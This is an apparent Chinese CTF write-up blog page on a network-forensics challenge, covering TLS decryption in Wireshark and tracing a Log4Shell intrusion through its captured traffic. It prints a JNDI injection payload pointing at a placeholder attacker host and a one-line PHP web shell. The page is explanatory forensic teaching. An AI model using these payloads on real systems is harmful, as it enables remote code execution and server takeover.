@@ -1,0 +1,899 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"复制成功","zh-CN":"复制成功","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"复制失败","zh-CN":"复制失败","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    磐石行动CTFWP |
+    
+    mX1@0_blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="磐石行动CTFWPMISCderderjia 题目：该死，一头狡猾的马攻击了我的服务器，并在上面上传了一个隐秘的文件，请你帮我找到这个文件，来惩治它。  1、拿到一个derderjia.pcapng，导出所有对象，有一个文件中包含TLS 1.3 会话密钥   2、将其导入wireshark的TLS配置中，这样就可以解密TLS的密文   3、追踪TLS流，发现有一个文件上传的数据包   4、将该数据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="磐石行动CTFWP">
+<meta property="og:url" content="http://example.com/2025/08/06/pan-shi-xing-dong-ctfwp/index.html">
+<meta property="og:site_name" content="mX1@0_blog">
+<meta property="og:description" content="磐石行动CTFWPMISCderderjia 题目：该死，一头狡猾的马攻击了我的服务器，并在上面上传了一个隐秘的文件，请你帮我找到这个文件，来惩治它。  1、拿到一个derderjia.pcapng，导出所有对象，有一个文件中包含TLS 1.3 会话密钥   2、将其导入wireshark的TLS配置中，这样就可以解密TLS的密文   3、追踪TLS流，发现有一个文件上传的数据包   4、将该数据">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20121054.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20121225.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20115238.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20101210.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20102401.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20102406.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20120532.png">
+<meta property="article:published_time" content="2025-08-06T04:07:47.518Z">
+<meta property="article:modified_time" content="2025-08-20T15:36:38.612Z">
+<meta property="article:author" content="mX1@0">
+<meta property="article:tag" content="WP">
+<meta property="article:tag" content="磐石行动CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20121054.png">
+  
+  
+  
+    <link rel="shortcut icon" href="/images/%E5%9B%BE1.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">加载中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归类</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" alt="磐石行动CTFWP">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">磐石行动CTFWP</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="sidebar-left"  >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8CTFWP"><span class="toc-text">磐石行动CTFWP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#derderjia"><span class="toc-text">derderjia</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-text">1. 这是什么攻击？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">2. 攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%BB%E5%87%BB%E8%80%85%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">(1) 攻击者构造恶意字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Log4j-%E8%A7%A3%E6%9E%90%E6%81%B6%E6%84%8F%E6%97%A5%E5%BF%97"><span class="toc-text">(2) Log4j 解析恶意日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84-LDAP"><span class="toc-text">(3) 服务器连接攻击者的 LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-text">(4) 服务器执行恶意代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F"><span class="toc-text">步骤 1：确认攻击流量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">步骤 2：查找文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1%EF%BC%9A%E6%A3%80%E6%9F%A5-HTTP-%E8%AF%B7%E6%B1%82"><span class="toc-text">方法 1：检查 HTTP 请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2%EF%BC%9A%E6%A3%80%E6%9F%A5-FTP-TFTP-SMB"><span class="toc-text">方法 2：检查 FTP&#x2F;TFTP&#x2F;SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-3%EF%BC%9A%E6%A3%80%E6%9F%A5-LDAP-JNDI-%E5%93%8D%E5%BA%94"><span class="toc-text">方法 3：检查 LDAP&#x2F;JNDI 响应</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-4%EF%BC%9A%E6%A3%80%E6%9F%A5-DNS-%E9%9A%90%E8%94%BD%E9%80%9A%E9%81%93"><span class="toc-text">方法 4：检查 DNS 隐蔽通道</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">步骤 3：提取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5-1%EF%BC%9AHTTP-%E4%B8%8A%E4%BC%A0"><span class="toc-text">情况 1：HTTP 上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5-2%EF%BC%9AFTP-TFTP-%E4%B8%8A%E4%BC%A0"><span class="toc-text">情况 2：FTP&#x2F;TFTP 上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5-3%EF%BC%9ALDAP-%E8%BF%94%E5%9B%9E%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-text">情况 3：LDAP 返回恶意类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5-4%EF%BC%9ABase64-DNS-%E9%9A%90%E8%94%BD%E4%BC%A0%E8%BE%93"><span class="toc-text">情况 4：Base64&#x2F;DNS 隐蔽传输</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-4%EF%BC%9A%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6"><span class="toc-text">步骤 4：分析文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%AE%83%E4%BB%AC%E8%A7%A3%E5%AF%86%E6%B5%81%E9%87%8F%EF%BC%9F"><span class="toc-text">3. 如何使用它们解密流量？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1%EF%BC%9AWireshark-%E8%A7%A3%E5%AF%86%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-text">方法 1：Wireshark 解密（推荐）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezDecryption"><span class="toc-text">ezDecryption</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">55</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">65</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-磐石行动CTFWP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-08-06T04:07:47.518Z" itemprop="datePublished">2025-08-06</time>
+    <time style="display: none;" id="post-update-time">2025-08-20</time>
+  </span>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/" data-aos="zoom-in">CTF</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="磐石行动CTFWP"><a href="#磐石行动CTFWP" class="headerlink" title="磐石行动CTFWP"></a>磐石行动CTFWP</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="derderjia"><a href="#derderjia" class="headerlink" title="derderjia"></a>derderjia</h3><blockquote>
+<p>题目：该死，一头狡猾的马攻击了我的服务器，并在上面上传了一个隐秘的文件，请你帮我找到这个文件，来惩治它。</p>
+</blockquote>
+<p>1、拿到一个derderjia.pcapng，导出所有对象，有一个文件中包含<strong>TLS 1.3 会话密钥</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20121054.png" style="zoom: 33%;">
+
+<p>2、将其导入wireshark的TLS配置中，这样就可以解密TLS的密文</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20121225.png" style="zoom: 50%;">
+
+<p>3、追踪TLS流，发现有一个文件上传的数据包</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20115238.png" style="zoom: 50%;">
+
+<p>4、将该数据包以原始数据的格式保存到本地，然后删除数据包的首尾，只保留数据本身，发现是PK开头，是一个ZIP数据包，更改为zip后缀，然后解压，发现需要密码，继续回wireshark查找</p>
+<p>5、在GET请求/的数据包中，看到在进行UA的jndi注入</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20101210.png" style="zoom: 67%;">
+
+<p>6、查找了一下资料，该种注入可能会在DNS种传输数据，那么查看DNS数据，发现存在base64加密数据，</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20102401.png" style="zoom:67%;">
+
+<p>7、解密之后得到压缩包的解压密码</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20102406.png" style="zoom: 50%;">
+
+<p>8、解压后得到一个图片，但是没有flag</p>
+<p>9、使用随波逐流自动改宽高，得到flag</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20120532.png" style="zoom:50%;">
+
+<blockquote>
+<p>拓展知识：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: ${jndi:ldap://attacker.com/a}\r\n</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>Log4Shell (CVE-2021-44228)</strong> 漏洞攻击</p>
+<h2 id="1-这是什么攻击？"><a href="#1-这是什么攻击？" class="headerlink" title="1. 这是什么攻击？"></a><strong>1. 这是什么攻击？</strong></h2><p>这是针对 <strong>Log4j 2.x</strong> 日志库的远程代码执行（RCE）漏洞利用尝试，称为 <strong>Log4Shell</strong>。</p>
+<hr>
+<h2 id="2-攻击原理"><a href="#2-攻击原理" class="headerlink" title="2. 攻击原理"></a><strong>2. 攻击原理</strong></h2><h3 id="1-攻击者构造恶意字符串"><a href="#1-攻击者构造恶意字符串" class="headerlink" title="(1) 攻击者构造恶意字符串"></a><strong>(1) 攻击者构造恶意字符串</strong></h3><p>http</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: ${jndi:ldap://attacker.com/a}</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><code>${jndi:ldap://attacker.com/a}</code> 是一个 <strong>Log4j 表达式</strong>，如果被记录到日志，Log4j 会解析并执行它。</li>
+</ul>
+<h3 id="2-Log4j-解析恶意日志"><a href="#2-Log4j-解析恶意日志" class="headerlink" title="(2) Log4j 解析恶意日志"></a><strong>(2) Log4j 解析恶意日志</strong></h3><ul>
+<li>当服务器使用 <strong>Log4j 2.x</strong> 记录 <code>User-Agent</code> 时，会解析 <code>${jndi:ldap://attacker.com/a}</code>。</li>
+<li><code>jndi</code> 表示 <strong>Java Naming and Directory Interface</strong>（Java 命名和目录接口），可以加载远程对象。</li>
+<li><code>ldap://attacker.com/a</code> 指向攻击者控制的 <strong>LDAP 服务器</strong>。</li>
+</ul>
+<h3 id="3-服务器连接攻击者的-LDAP"><a href="#3-服务器连接攻击者的-LDAP" class="headerlink" title="(3) 服务器连接攻击者的 LDAP"></a><strong>(3) 服务器连接攻击者的 LDAP</strong></h3><ul>
+<li>受害服务器会向 <code>attacker.com</code> 请求恶意代码。</li>
+<li>LDAP 服务器返回一个 <strong>恶意 Java 类</strong>（如反弹 shell、挖矿木马等）。</li>
+</ul>
+<h3 id="4-服务器执行恶意代码"><a href="#4-服务器执行恶意代码" class="headerlink" title="(4) 服务器执行恶意代码"></a><strong>(4) 服务器执行恶意代码</strong></h3><ul>
+<li>Log4j 动态加载并执行攻击者提供的代码，导致 <strong>远程命令执行</strong>（RCE）。</li>
+</ul>
+<p>根据题目描述，攻击者通过 <strong>Log4Shell (CVE-2021-44228)</strong> 漏洞入侵了服务器，并上传了一个隐秘文件。我们需要在 <strong>Wireshark 抓包数据</strong> 中分析可能的文件传输行为。</p>
+<hr>
+<h2 id="步骤-1：确认攻击流量"><a href="#步骤-1：确认攻击流量" class="headerlink" title="步骤 1：确认攻击流量"></a><strong>步骤 1：确认攻击流量</strong></h2><p>首先，检查是否有 <strong>JNDI/LDAP 恶意请求</strong>（如 <code>${jndi:ldap://attacker.com/...}</code>）：</p>
+<ol>
+<li>在 Wireshark 中按 <code>Ctrl + F</code> 搜索 <code>${jndi:</code> 或 <code>ldap://</code>。</li>
+<li>如果找到相关流量，说明攻击者利用了 <strong>Log4Shell</strong>。</li>
+</ol>
+<hr>
+<h2 id="步骤-2：查找文件上传"><a href="#步骤-2：查找文件上传" class="headerlink" title="步骤 2：查找文件上传"></a><strong>步骤 2：查找文件上传</strong></h2><p>攻击者可能通过以下方式上传文件：</p>
+<ol>
+<li><strong>HTTP POST 请求</strong>（常见于 Web Shell 上传）</li>
+<li><strong>FTP/TFTP 传输</strong>（如果服务器开放了文件传输服务）</li>
+<li><strong>Base64 编码传输</strong>（隐藏在 HTTP 请求或 LDAP 响应中）</li>
+<li><strong>DNS 隐蔽通道</strong>（较少见，但可能用于小文件传输）</li>
+</ol>
+<h3 id="方法-1：检查-HTTP-请求"><a href="#方法-1：检查-HTTP-请求" class="headerlink" title="方法 1：检查 HTTP 请求"></a><strong>方法 1：检查 HTTP 请求</strong></h3><ul>
+<li><p>在 Wireshark 过滤器中输入：</p>
+<p>  text</p>
+  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == "POST"</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>查看是否有 <strong>文件上传</strong>（如 <code>.jsp</code>、<code>.php</code>、<code>.war</code> 等 Web Shell）。</p>
+</li>
+</ul>
+<h3 id="方法-2：检查-FTP-TFTP-SMB"><a href="#方法-2：检查-FTP-TFTP-SMB" class="headerlink" title="方法 2：检查 FTP/TFTP/SMB"></a><strong>方法 2：检查 FTP/TFTP/SMB</strong></h3><ul>
+<li><p>过滤：</p>
+<p>  text</p>
+  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp || tftp || smb</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>查找 <strong>文件传输</strong>（如 <code>STOR</code>、<code>PUT</code> 命令）。</p>
+</li>
+</ul>
+<h3 id="方法-3：检查-LDAP-JNDI-响应"><a href="#方法-3：检查-LDAP-JNDI-响应" class="headerlink" title="方法 3：检查 LDAP/JNDI 响应"></a><strong>方法 3：检查 LDAP/JNDI 响应</strong></h3><ul>
+<li>攻击者可能通过 <strong>LDAP 返回恶意类</strong>（<code>.class</code> 文件）。</li>
+<li>查找 <strong>LDAP 响应包</strong>，检查是否包含 <strong>Java 字节码</strong> 或 <strong>Base64 编码数据</strong>。</li>
+</ul>
+<h3 id="方法-4：检查-DNS-隐蔽通道"><a href="#方法-4：检查-DNS-隐蔽通道" class="headerlink" title="方法 4：检查 DNS 隐蔽通道"></a><strong>方法 4：检查 DNS 隐蔽通道</strong></h3><ul>
+<li><p>过滤：</p>
+<p>  text</p>
+  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>查找 <strong>异常长域名</strong>（如 <code>aGVsbG8gd29ybGQ=.attacker.com</code>，可能是 Base64 编码文件）。</p>
+</li>
+</ul>
+<hr>
+<h2 id="步骤-3：提取文件"><a href="#步骤-3：提取文件" class="headerlink" title="步骤 3：提取文件"></a><strong>步骤 3：提取文件</strong></h2><h3 id="情况-1：HTTP-上传"><a href="#情况-1：HTTP-上传" class="headerlink" title="情况 1：HTTP 上传"></a><strong>情况 1：HTTP 上传</strong></h3><ol>
+<li>找到 <strong>POST 请求</strong>，右键 → <strong>Follow → HTTP Stream</strong>。</li>
+<li>检查是否有 <strong>文件内容</strong>（如 <code>&lt;?php system($_GET["cmd"]); ?&gt;</code>）。</li>
+</ol>
+<h3 id="情况-2：FTP-TFTP-上传"><a href="#情况-2：FTP-TFTP-上传" class="headerlink" title="情况 2：FTP/TFTP 上传"></a><strong>情况 2：FTP/TFTP 上传</strong></h3><ol>
+<li>找到 <strong>STOR/PUT 命令</strong>，右键 → <strong>Follow → TCP Stream</strong>。</li>
+<li>提取传输的文件数据。</li>
+</ol>
+<h3 id="情况-3：LDAP-返回恶意类"><a href="#情况-3：LDAP-返回恶意类" class="headerlink" title="情况 3：LDAP 返回恶意类"></a><strong>情况 3：LDAP 返回恶意类</strong></h3><ol>
+<li>找到 <strong>LDAP 响应包</strong>，查看返回的 <strong>Java 类数据</strong>。</li>
+<li>可以保存为 <code>.class</code> 并用 <code>javap -c</code> 反编译。</li>
+</ol>
